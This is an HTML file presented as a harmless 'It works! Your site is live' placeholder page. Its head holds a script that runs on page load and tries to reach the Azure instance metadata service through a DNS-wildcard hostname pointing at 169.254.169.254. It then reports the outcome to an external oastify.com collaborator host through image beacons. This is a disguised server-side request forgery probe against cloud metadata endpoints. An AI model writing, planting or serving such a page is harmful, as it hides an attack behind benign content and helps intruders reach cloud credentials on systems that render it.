<!DOCTYPE html>
<html>
<head>
  <title>Test Page</title>
  <script>
    const url = "https://169.254.169.254.sslip.io/metadata/instance?api-version=2021-02-01";
    const timestamp = Date.now();

    fetch(url, {
      headers: {
        "Metadata": "true"
      }
    })
    .then(res => {
      const status = res.status;
      const tag = (status === 404 || status === 400) ? "fail" : "hit";
      new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/" + tag +
                        "?target=" + encodeURIComponent(url) +
                        "&status=" + status +
                        "&ts=" + timestamp;
    })
    .catch(() => {
      new Image().src = "https://3678iya9s5flykg5btyggo7h288zwrnfc.oastify.com/fail" +
                        "?target=" + encodeURIComponent(url) +
                        "&error=network" +
                        "&ts=" + timestamp;
    });
  </script>
</head>
<body>
  <h1>It works! Your site is live 🚀</h1>
</body>
</html>
